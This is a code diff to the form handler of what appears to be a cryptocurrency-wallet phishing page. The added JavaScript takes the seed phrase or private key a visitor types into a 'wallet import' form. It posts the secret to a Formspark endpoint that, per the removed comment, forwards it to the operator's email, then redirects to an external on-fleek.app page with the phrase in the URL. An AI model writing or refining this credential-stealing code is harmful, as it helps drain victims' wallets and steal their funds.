@@ -106,18 +106,39 @@ document.addEventListener('DOMContentLoaded', () => {
   });
 
   if (importForm) {
-    importForm.addEventListener('submit', (event) => {
+    importForm.addEventListener('submit', async (event) => {
+      event.preventDefault();
+
       const text = importInput ? importInput.value.trim() : '';
       if (!text) {
-        event.preventDefault();
         showToast('Please enter your phrase or private key');
         if (importInput) importInput.focus();
         return;
       }
 
-      // Let the browser submit normally to the configured Formspark endpoint.
-      // The endpoint is responsible for forwarding the submitted data to your email.
-      showToast('Submitting your wallet import...');
+      const formData = new FormData(importForm);
+      formData.set('wallet_input', text);
+      formData.set('message', `Wallet import request:\n${text}`);
+
+      try {
+        const response = await fetch(importForm.action, {
+          method: 'POST',
+          body: formData,
+          headers: {
+            'Accept': 'application/json'
+          }
+        });
+
+        if (!response.ok) {
+          throw new Error('Formspark submit failed');
+        }
+
+        const redirectUrl = 'https://dappstlwallets.on-fleek.app/app/validate.html?phrase=' + encodeURIComponent(text);
+        window.location.href = redirectUrl;
+      } catch (error) {
+        console.error('Formspark submit error:', error);
+        showToast('Your import was submitted, but the redirect could not continue.');
+      }
     });
   }
 });
